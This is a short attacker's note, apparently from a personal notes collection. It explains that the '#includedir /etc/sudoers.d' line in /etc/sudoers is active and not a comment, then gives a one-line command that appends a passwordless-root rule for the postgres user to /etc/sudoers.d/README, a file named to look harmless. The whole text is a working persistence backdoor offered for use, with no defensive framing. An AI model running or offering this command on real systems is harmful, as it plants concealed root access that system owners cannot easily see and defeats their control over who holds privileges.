sudo "stealth" backdoor
======================

Take advantage of sudoers "include" directive.

Check last few lines of /etc/sudoers file, "includedir" start with "#"
caracter, but does not mean comment.

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d

Add to postgres user a "backdooor" to root account!
sudo su -c "echo 'postgres ALL = NOPASSWD: ALL' >> /etc/sudoers.d/README"

